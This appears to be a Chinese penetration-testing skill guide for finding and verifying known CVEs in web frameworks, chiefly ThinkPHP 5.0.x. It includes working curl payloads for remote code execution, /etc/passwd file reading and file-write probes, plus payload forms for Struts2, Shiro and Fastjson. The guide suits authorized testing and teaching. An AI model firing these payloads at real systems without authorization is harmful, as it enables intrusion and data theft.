---
id: "NDAY-39"
title: "框架与组件已知漏洞 (N-day Framework & Component Vulnerabilities)"
category: "框架与组件漏洞"
category_en: "FrameworkComponentNday"
difficulty: ★★★
tools: "curl, searchsploit, nuclei, ysoserial, PHPGGC, Web 检索"
source: "自建 · N-day 检索与复现流程"
---
# 框架与组件已知漏洞 (N-day Framework & Component Vulnerabilities)

## 概述

库里多数技能都是「按输入点测」——看到一个参数，判断它可能进到哪儿，再配对应手法。
这一条是另一种打法：**先认组件和版本，再去对照这个版本有哪些公开的已知漏洞**，也就是 N-day。

判据很直接：**如果目标用的是一个带版本号的老组件，那它的问题大概率不是「你测出来的」，而是「早就被人写好、挂在网上」的。**

适用范围：ThinkPHP、Spring、Struts2、Fastjson、WebLogic、Shiro、WordPress、Drupal、Django、Flask，以及 Composer / npm / pip 依赖里的第三方组件。**注意：N-day 验证同样只在授权范围内做，只证明存在，不做深入利用。**

两种打法的差别，用一句话区分：

| | 按输入点测 | 按组件测（本条） |
|:---|:---|:---|
| 入口 | 一个可控参数 | 一个框架名 + 版本号 |
| 依赖 | 参数能进到危险函数 | 版本落在某个 CVE 的影响区间内 |
| 手法来源 | 自己构造 payload | 去网上检索现成 PoC |
| 典型产出 | 「这个参数没校验」 | 「这个版本有这个 CVE，一请求就能打」 |

整个流程四步：**版本识别 → 联网检索 CVE 与 PoC → 逐项验证 → 判定、影响确认与清理归档**。

## 核心技能

### 1. 版本识别（这一步决定后面能不能搜到）

N-day 的入口是**精确版本号**，不是框架名。框架名只能搜到一堆泛泛的科普文，精确到修订号（`5.0.20` 而不是 `5.0.x`）才能对上一个具体的影响区间。

按序尝试下面四种手法：

```bash
# 手法 1（首选·无副作用）：触发框架异常页，读错误页里的版本号
# ThinkPHP 会在错误页输出 <span>V5.0.20</span>
curl -s -g 'http://target.com/index.php?s=/index/NotExistClass/foo' | grep -oE '<span>V[0-9.]+</span>'

# 手法 2：响应头与 Cookie 直接给的版本（最省事，但常被隐藏）
curl -s -I 'http://target.com/'
# Server: nginx/1.24.0
# X-Powered-By: PHP/7.3.4
# Set-Cookie: PHPSESSID=xxx

# 手法 3：默认端点与说明文件（CMS 类命中率高）
curl -s 'http://target.com/actuator/info'        # Spring Boot
curl -s 'http://target.com/CHANGELOG.md'         # 部分开源项目会留
curl -s 'http://target.com/wp-json/'             # WordPress 会回版本与插件清单

# 手法 4：报错堆栈（仅当 debug 打开，会连带泄露绝对路径与代码片段）
curl -s 'http://target.com/xxx_random_test_123'
```

**线索转结论速查表**：

| 维度 | 线索 | 结论 |
|:---|:---|:---|
| 响应头 | `X-Powered-By: PHP/7.x` | PHP |
| 响应头 | `Server: gunicorn` / `Werkzeug` | Python（Django / Flask） |
| 响应头 | `Server: Apache-Coyote` | Java（Tomcat / Spring） |
| 响应头 | `X-AspNet-Version` | ASP.NET |
| Cookie | `PHPSESSID` / `JSESSIONID` / `ASPSESSIONID` | PHP / Java / ASP |
| Cookie | 带点的自定义令牌（`eyJ...`） | Flask session 或 JWT |
| 报错页 | 「ThinkPHP」、`#0 think\` | ThinkPHP |
| 报错页 | 「Whitelabel Error Page」 | Spring Boot |
| 报错页 | 黄色 DEBUG 页 + Django | Django，且 `DEBUG=True` |
| 报错页 | 「Apache Struts」 | Struts2 |
| 路由 | `/index.php?s=/` | ThinkPHP |
| 路由 | `/wp-admin`、`/wp-content` | WordPress |
| 目录 | `/vendor/` 可列目录 | Composer 依赖暴露 |
| 端点 | `/actuator` | Spring Boot Actuator |
| 端点 | `/phpmyadmin` | phpMyAdmin |

产出四个值，后面检索直接代入：**框架名 / 版本号 / 组件清单 / 报错特征串**。

> 拿到版本后不要停手，**组件清单比框架名更值钱**。PHP 版本、Web 服务器、数据库、第三方依赖，每一个都可能是 N-day 的入口——很多站点框架版本很新，但挂着三年前的插件。

### 2. 联网检索 CVE 与 PoC

版本拿到后，用检索能力跑下面几组检索式，方括号换成上一步的实际值：

```
"[框架名] [版本号] CVE"
"[框架名] 远程代码执行 exploit"
"[框架名] [版本号] poc github"
"[组件清单] 漏洞 复现"
site:exploit-db.com [框架名]
```

版本模糊时先去掉版本搜框架名，再从影响区间反推；也可以直接搜报错特征串，**命中率常常高于框架名**——因为报错串是站的独有特征，而框架名是全网热词。

**信源优先级**（从高到低）：

1. 厂商官方安全公告
2. CVE 官方描述（NVD / CNVD / CNNVD）
3. Exploit-DB
4. 公开漏洞库与社区复现文章
5. GitHub PoC 仓库

**命中项记录字段**（六项，缺一项后面就没法验）：

| 字段 | 说明 |
|:---|:---|
| CVE / CNVD 编号 | 如 CVE-2018-25270 |
| 影响版本区间 | 必须与实测版本精确比对，不是"看着像" |
| 漏洞类型 | RCE / 反序列化 / SSRF / 文件读取 / 未授权 |
| 所需前提 | 是否需登录、是否需特定配置或路由 |
| payload 形态 | GET 路由 / POST JSON / 文件上传 / 请求头注入 |
| 回显特征 | 判定用的具体字符串 |

**筛选原则**：优先「无需认证 / 单请求 / 有明确回显」的三项全占项。前提不满足的标「⚠️ 待确认」，**不要直接判不存在**——依赖某个业务路由的漏洞，目标刚好有这个功能时就是能打。

### 3. 逐项验证

#### 3.1 复现单元（每执行一个测试步骤就输出一个）

这是**测试过程的记录格式**，禁止合并、禁止省略、禁止只给结论：

```
┌─ [阶段 X.Y · 测试项 N/M] 步骤名称
│ ① 操作：<完整 curl 命令，整行可复制>
│ ② 返回（仅贴决定性关键行，不贴整页 HTML）：
│     HTTP/1.1 200 / 关键响应头 / 关键响应体片段
│ ③ 观察：<一句话说明实际发生了什么>
│ ④ 判定：✅ 漏洞存在 / ❌ 不存在 / ⚠️ 待确认
│ ⑤ 判定依据：<一句话说明「为什么这行返回能证明结论」>
└──────────────────────────────────────
```

示例：

```
┌─ [阶段 3.1 · 测试项 1/6] ThinkPHP invokefunction RCE
│ ① 操作：curl -s -g 'http://target.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami'
│ ② 返回：HTTP/1.1 200 / 响应体首行：www-data
│ ③ 观察：服务端执行了 system('whoami') 并把结果回显到页面
│ ④ 判定：✅ 漏洞存在（远程代码执行）
│ ⑤ 判定依据：返回体直接包含 whoami 的真实执行结果，说明用户输入被当作函数调用执行
└──────────────────────────────────────
```

**只读验证原则**：RCE 只用 `whoami` / `id` / `phpinfo()` 这类只读命令证明执行权限；**不落地 Webshell、不改配置、不删数据**。要证明写权限时，写一个探针文件、读回、再删掉，三步做完即止。

#### 3.2 框架 → 漏洞类型 → payload 形态

| 框架 | 典型漏洞类型 | 检索方向 | payload 形态 |
|:---|:---|:---|:---|
| ThinkPHP | 5.0.x / 5.1.x 多处 RCE | `ThinkPHP 5.0.x invokefunction RCE` | `?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id` |
| Spring | Spring4Shell、Actuator 未授权、Spring Cloud 文件读取 | `Spring 远程代码执行 CVE-2022-22965` | `class.module` 参数 DataBinder 绑定链 |
| Struts2 | OGNL 注入（S2-045 / S2-046 / S2-057） | `Struts2 S2-045 exploit` | `Content-Type` 头注入 OGNL 表达式 |
| Java 反序列化 | CommonsCollections / Fastjson / Jackson | `Fastjson 反序列化 RCE` | POST JSON 触发 autotype 类加载 |
| PHP 反序列化 | Phar、`unserialize` 利用链 | `Phar 反序列化 利用链` | 上传伪装成图片的 Phar 文件后触发 |
| Weblogic | T3 / IIOP 反序列化、未授权控制台 | `Weblogic T3 反序列化` | T3 协议自定义数据包 |
| Shiro | rememberMe 反序列化 | `Shiro rememberMe 反序列化` | Cookie 中 `rememberMe` 字段 |
| WordPress | 核心 / 插件 / 主题 CVE | `WordPress [插件名] CVE` | 插件端点未授权调用 |
| Django | DEBUG 模式信息泄露、历史 CVE | `Django debug 远程代码执行` | DEBUG=True 下特定视图触发 |
| Flask | debug PIN 绕过、SSTI | `Flask debug pin 绕过` | 算 PIN 后访问 `/console`，或 `__class__` 链 SSTI |

> 上表只是检索方向与 payload 形态示意，**实际执行以当次检索结果为准**，不要凭表直接下判定。

#### 3.3 五类漏洞的判定锚点

N-day 的判定锚点不是「参数有没有过滤」，而是「实测结果与检索到的影响区间、回显特征是否对上」。逐类只需盯一个点：

| 类型 | 判定锚点 | 边界 |
|:---|:---|:---|
| RCE | 响应里出现命令的真实执行结果 | 只用 `whoami` / `id` / `phpinfo` 等只读命令 |
| 反序列化 | 触发点被调用，回显或报错差异符合预期 | 链用现成的，只验触发，不自己组链 |
| 文件读取 | 读到的内容与该 CVE 声明的端点/路径对得上 | 只读一个证明性文件，不通读 |
| SSRF | 服务端真的发出了请求，并回显内网或本地响应特征 | 只到证明能发包为止，不横向 |
| 未授权访问 | 不带会话返回 200，且带真实业务数据 | 403 / 302 / 统一错误页不算命中 |

#### 3.4 实测样本：ThinkPHP 5.0.x

拿到精确版本号后可按下表对号入座，能省一轮检索；仍建议用一次检索复核影响区间。

| 漏洞 | 影响区间 | 入口 | 5.0.20 实测 |
|:---|:---|:---|:---|
| CVE-2018-20062 / CVE-2018-25270 / CNVD-2018-24942 | 5.0.0 ~ 5.0.22（5.0.23 修复） | `?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id` | ✅ 命中，回显 `uid=33(www-data)` |
| CNVD-2019-01092 / CVE-2019-9082（Request 变量覆盖 RCE） | 5.0.0 ~ 5.0.23（5.0.24 修复） | `POST ?s=captcha` + `_method=__construct&filter[]=system&method=get&get[]=whoami`；captcha 路由不存在时改打任一调用 param/input 的业务入口（如搜索路由） | ✅ 命中（5.0.22 实测：captcha 路由 404，经搜索路由 POST 触发，回显 whoami 结果） |
| 多语言文件包含（无独立 CVE/CNVD 编号，社区归入 2018-12 披露批次） | 5.0.x / 5.1.x（5.0.24 / 5.1.31 修复） | `?s=index/\think\Lang/load&file=C:\Windows\win.ini` | ✅ 命中，回显 win.ini 内容 |
| — | — | `?s=/index/\think\Container/invokefunction` | ❌ 5.0.20 无 `think\Container` 类 |
| — | — | `?s=index/\think\template\driver\file/write` | ❌ 参数结构不匹配，改用 `file_put_contents` 链 |

**关键提醒**：5.0.23 只修了 CVE-2018-20062，仍被 CVE-2019-9082 击穿；5.0.x 线要升到 5.0.24+，5.1.x 线要升到 5.1.31+。

另注：`app_debug=false` **不影响** CVE-2018-20062 的利用，生产模式下同样可未授权 RCE。

完整演示（四步，写完探针即删）：

```bash
# 步骤 1：未登录单请求 RCE —— 出现命令回显即命中（只读命令，不落地）
curl -s -g 'http://target.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'

# 步骤 2：确认精确版本（决定命中哪个 CVE 区间）
curl -s -g 'http://target.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/var/www/thinkphp/base.php' | grep THINK_VERSION
# 返回示例：define('THINK_VERSION', '5.0.20');

# 步骤 3：任意文件读取（多语言文件包含，无独立编号，Lang::load 路径未过滤）
curl -s -g 'http://target.com/index.php?s=index/\think\Lang/load&file=/etc/passwd'
# 命中特征：返回 root:x:0:0:root:/root:/bin/bash

# 步骤 4：写权限验证（探针写完即删）
curl -s -g 'http://target.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=/var/www/public/tp_probe.txt&vars[1][]=PROBE_OK'
curl -s 'http://target.com/tp_probe.txt'          # 读回 PROBE_OK 即证明可写
curl -s -g 'http://target.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=unlink&vars[1][]=/var/www/public/tp_probe.txt'
```

**`vars` 参数结构**（决定 ThinkPHP payload 成败）：`invokefunction` 底层是 `call_user_func_array($function, $vars)`，`vars[0]` 是目标函数名，`vars[1]` 是**参数数组**，多参数要重复写 `vars[1][]`：

```bash
# system('id') —— 单参数
vars[0]=system&vars[1][]=id

# file_put_contents($path, $content) —— 双参数，两个都写 vars[1][]
vars[0]=file_put_contents&vars[1][]=/var/www/public/probe.txt&vars[1][]=CONTENT
# 写成 vars[2]=content 会失败（返回框架 System Error 页）
```

### 4. 判定、影响确认与清理归档

1. **存在性判定**：每个漏洞补一句「新手直验」——一句话讲清访问哪个地址、看到什么特征就能判断漏洞存在，且必须用真实地址与真实返回特征（字段格式见「输出格式」）。
2. **影响范围**：是否需登录态（无需登录 / 普通用户 / 管理员）、RCE 权限等级、可读取的数据范围、可越权的边界。
3. **清理**：验证后删除或覆盖上传的探针文件，不保留任何持久化控制文件；只留最小证据（Cookie 文件、关键响应、PoC 请求记录）。

## 覆盖清点

一次完整的 N-day 排查要过完下面三组，某条不适用标 N/A 继续，**不因某个功能不存在而中断整体执行**：

- **框架与组件层**：框架 RCE（ThinkPHP / Spring / Struts2）· 反序列化链（Java / PHP）· CMS 核心与插件 CVE（WordPress / Drupal）· 中间件（Tomcat / Weblogic / Nginx）
- **功能与端点层**：未授权默认端点（Actuator / `/vendor/` / `.git` / phpMyAdmin）· 文件读取与路径穿越 · 框架内置功能的 SSRF 滥用 · 模板引擎表达式解析（Jinja2 / Freemarker / Thymeleaf / Velocity）
- **依赖与信息层**：第三方依赖 CVE（Composer / npm / pip）· 信息泄露（报错堆栈暴露版本、备份文件、环境变量文件）· 版本与影响区间比对

## curl 转义规则（高频出错点）

| 场景 | 正确写法 | 原因 |
|:---|:---|:---|
| **URL 含方括号**（`vars[0]`、`vars[1][]`、`filter[]`） | `curl -s -g 'http://...&vars[0]=system&vars[1][]=id'` | **必须加 `-g`（`--globoff`）**，否则 curl 把 `[]` 当通配语法，静默发出空请求 → 误判为「漏洞不存在」 |
| GET 路由 payload 含反斜杠 | `curl -s -g 'http://...?s=/index/\think\app/...'` | 双引号下 shell 会吞掉反斜杠，用单引号 + `-g` |
| POST payload 含引号或空格 | `curl -s -g -G --data-urlencode 'k=v' URL` | 避免 shell 转义错误 |
| 文件上传类 | `curl -s -F "field=@file;type=image/jpeg;filename=x.php" URL` | multipart 构造 |
| 只看状态码 | `curl -s -g -o /dev/null -w "%{http_code}\n" URL` | Windows CMD 下 `/dev/null` 换成 `NUL` |
| 带会话 | `curl -s -g -b cookies_pentest.txt -c cookies_pentest.txt URL` | 读写同一个 Cookie 文件 |
| **反斜杠被翻倍**（实测踩坑，2026-09-28） | 命令最终在**单引号**里时只写一层 `\think\app`；只有在双引号或需要转义的构造层里才写 `\\` | 命令经多层构造（JSON 参数 → bash、脚本生成器、二次拼接）时每层都会再转义一次，`\` 极易被翻成 `\\`，实际发出 `\\think\\app` → `class_exists` 失败 → 返回「类不存在」页，**活漏洞被误判成已修复**（真实案例：TP 5.0.22 invokefunction 全链误判） |
| **核对实际发出的字节**（反斜杠 payload 必做） | 打一发规范 payload + 一发假类（如 `\think\noexistclass`）对照；看错误页回显的类名带几个反斜杠 | 回显 `\\think\\app` = 实际发出了双反斜杠，转义链路有问题，加 `-g` 重写都不用，先修转义；回显 `\think\noexistclass` 正常报「类不存在」说明链路没问题，才可继续下判定 |

> **默认规则**：本条技能里所有带 `[` 或 `]` 的验证命令一律加 `-g`，不要等失败了再补；**所有带 `\` 的验证命令，发出前必须核对实际字节（回显类名 / 假类对照），不要凭返回的报错文案下结论。**

**glob 误吞排查法**：空响应体时先加 `-w "\n[http_code=%{http_code} size=%{size_download}]\n"` 看响应大小。若 `size=0` 而同一站点的普通请求正常，十有八九是 glob 问题，加 `-g` 重发。

## 输出格式

测试过程按 3.1 的复现单元逐条记录；全部跑完后，按下面三份汇总输出。

### 单个漏洞（九字段，缺一不可）

```
● 漏洞名称：
● 漏洞编号：（如 FRAME-01 / RCE-01）
● 漏洞等级：（严重 / 高危 / 中危 / 低危）
● 漏洞类型：（框架 RCE / 框架反序列化 / 框架文件读取 / 框架 SSRF / 框架未授权访问 …）
● 来源 / CVE：（注明编号与检索来源 URL）
● 具体操作步骤：
  步骤 1：精确操作内容
  步骤 2：精确操作内容
  （须包含完整 URL、请求方法、参数名、参数值、请求头修改内容）
● 原始 HTTP 请求示例：<粘贴完整请求报文>
● 验证命令：<可直接执行的 curl 单行命令>
● 验证判定（新手直验）：访问 [具体 URL / 提交具体请求]，若出现 [具体特征串]，则可判断 [漏洞名称] 存在
● 利用效果：<可达成的最终效果与影响范围>
```

「新手直验」一句必须用**真实目标地址 + 真实返回特征**，不得用占位符、不得省略。

### 检索与验证对照表

| 框架 / 组件 | CVE | 漏洞类型 | 可执行 curl | 回显特征 | 来源 URL |
|:---|:---|:---|:---|:---|:---|

### 最短攻击路径

所有测试完成后，梳理从**外部未登录状态**到**最高权限或核心数据**的最短路径：

```
Step 1 → [操作]  利用：[漏洞名]  得到：[权限/效果]
Step 2 → [操作]  利用：[漏洞名]  得到：[权限/效果]
```

要求步骤最少、操作最简单，全程只用浏览器 + curl 即可复现。

## 常见坑

- **只贴关键行**：响应体不要整页贴，只贴能证明结论的那几行。
- **debug 关闭时的通用错误页**：ThinkPHP 等框架在生产模式下返回无堆栈的 `System Error` 页，无法据此判断 payload 是否触达。要确认失败原因，改用**返回体大小对比 + 换等价调用链交叉验证**，不要凭错误页直接判「不存在」。
- **错误页文案不是补丁证据**（实测踩坑，2026-09-28）：应用层常对「类加载失败」做通用翻译（如中文「控制器不存在：\think\app」），任何不可加载的类都会触发——TP 5.0.22 原生报错是英文 `controller not exists`，看到中文报错不能反推「核心被改造/已打补丁」。判定补丁状态只有两条硬路：**查框架源码**（补丁特征如控制器名正则校验）或**规范 payload 实测命中**。中间遇到「类不存在」类报错，先用假类（`\think\noexistclass`）+ 单反斜杠对照，区分「payload 转义发错」还是「真被拦截」。
- **搜不到不等于没有**：老框架的中文复现文章常散在社区与个人博客，换中文关键词再搜一轮，或直接用 CVE 编号搜。

## 常用工具
| 工具 | 用途 | 链接 |
|:---|:---|:---|
| curl | 构造与验证 payload，本条流程唯一必需的工具，其余都是加速 | 系统自带 |
| searchsploit | 本地 Exploit-DB 检索，不联网也能找 PoC | Kali 自带 |
| nuclei | 用模板批量扫已知 CVE，快速过一遍常见组件 | https://github.com/projectdiscovery/nuclei |
| ysoserial | Java 反序列化链生成（CommonsCollections 等） | https://github.com/frohoff/ysoserial |
| PHPGGC | PHP 反序列化链生成（Phar 等） | https://github.com/ambionics/phpggc |

## 参考资源
- [NVD - 美国国家漏洞库](https://nvd.nist.gov/)（影响版本区间以此为准）
- [CNVD - 国家信息安全漏洞共享平台](https://www.cnvd.org.cn/)
- [CNNVD - 国家信息安全漏洞库](https://www.cnnvd.org.cn/)
- [Exploit-DB](https://www.exploit-db.com/)（现成 PoC 检索）
- 检索与验证流程：自建 · 参考公开 N-day 复现流程整理
